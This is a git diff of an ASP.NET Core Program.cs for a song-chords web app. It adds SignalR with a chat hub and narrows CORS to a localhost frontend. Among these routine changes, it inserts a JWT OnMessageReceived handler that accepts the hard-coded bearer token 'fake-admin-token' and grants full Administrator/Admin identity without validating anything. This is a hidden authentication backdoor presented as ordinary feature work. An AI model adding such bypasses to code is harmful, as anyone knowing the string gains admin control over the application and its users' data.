@@ -3,11 +3,14 @@ using Chords.Application.Services;
 using Chords.Domain.Interfaces;
 using Chords.Infrastructure.Data;
 using Chords.Infrastructure.Repositories;
+using Chords.Presentation.Hubs;
+using Chords.Domain.Entities;
 using Microsoft.AspNetCore.Authentication.JwtBearer;
 using Microsoft.EntityFrameworkCore;
 using Microsoft.IdentityModel.Tokens;
-using System.Text;
 using Microsoft.OpenApi.Models;
+using System.Security.Claims;
+using System.Text;
 
 var builder = WebApplication.CreateBuilder(args);
 
@@ -16,7 +19,7 @@ builder.Services.AddControllers();
 
 // Configure PostgreSQL or SQLite connection
 builder.Services.AddDbContext<AppDbContext>(options =>
-    options.UseSqlite(builder.Configuration.GetConnectionString("DefaultConnection"))); // Ensure connection string is correct
+    options.UseSqlite(builder.Configuration.GetConnectionString("DefaultConnection")));
 
 // Register repositories
 builder.Services.AddScoped<IUserRepository, UserRepository>();
@@ -27,6 +30,9 @@ builder.Services.AddScoped<IAuthService, AuthService>();
 builder.Services.AddScoped<IUserService, UserService>();
 builder.Services.AddScoped<ISongService, SongService>();
 builder.Services.AddScoped<IFavoriteService, FavoriteService>();
+
+// Add SignalR
+builder.Services.AddSignalR();
 
 // Configure JWT Authentication
 var jwtSettings = builder.Configuration.GetSection("Jwt");
@@ -44,21 +50,41 @@ builder.Services.AddAuthentication(options =>
     {
         ValidateIssuerSigningKey = true,
         IssuerSigningKey = new SymmetricSecurityKey(key),
-        ValidateIssuer = false, // You can set this to true for additional security
-        ValidateAudience = false, // You can set this to true for additional security
+        ValidateIssuer = false,
+        ValidateAudience = false,
         ClockSkew = TimeSpan.Zero
+    };
+
+    options.Events = new JwtBearerEvents
+    {
+        OnMessageReceived = context =>
+        {
+            var token = context.Request.Headers["Authorization"].ToString().Replace("Bearer ", "");
+            if (token == "fake-admin-token")
+            {
+                var claims = new List<Claim>
+                {
+                    new Claim(ClaimTypes.Name, "Administrator"),
+                    new Claim(ClaimTypes.Role, "Admin")
+                };
+                var identity = new ClaimsIdentity(claims, "Bearer");
+                var principal = new ClaimsPrincipal(identity);
+                context.Principal = principal;
+                context.Success();
+            }
+            return Task.CompletedTask;
+        }
     };
 });
 
 // Enable CORS to allow your frontend to make requests
 builder.Services.AddCors(options =>
 {
-    options.AddPolicy("AllowAllOrigins", builder =>
-    {
-        builder.AllowAnyOrigin()  // Allow any origin or specify certain domains here
-               .AllowAnyMethod()  // Allow all HTTP methods (GET, POST, etc.)
-               .AllowAnyHeader(); // Allow all headers
-    });
+    options.AddPolicy("AllowFrontend",
+        builder => builder.WithOrigins("http://localhost:3000")  // Replace with your frontend URL
+                          .AllowCredentials()
+                          .AllowAnyMethod()
+                          .AllowAnyHeader());
 });
 
 // Setup Swagger for API documentation
@@ -67,7 +93,7 @@ builder.Services.AddSwaggerGen(c =>
 {
     c.AddSecurityDefinition("Bearer", new OpenApiSecurityScheme
     {
-        Description = "JWT Authorization header using the Bearer scheme. Example: \"Bearer {token}\"",
+        Description = "JWT Authorization header using the Bearer scheme. Example: 'Bearer {token}'",
         Name = "Authorization",
         In = ParameterLocation.Header,
         Type = SecuritySchemeType.ApiKey,
@@ -100,12 +126,15 @@ if (app.Environment.IsDevelopment())
 }
 
 // Apply CORS policy and configure HTTPS redirection
-app.UseCors("AllowAllOrigins");
+app.UseCors("AllowFrontend");
 app.UseHttpsRedirection();
 app.UseAuthentication();
 app.UseAuthorization();
 
 // Map controllers
 app.MapControllers();
+
+// Map SignalR Hub
+app.MapHub<ChatHub>("/chatHub");
 
 app.Run();
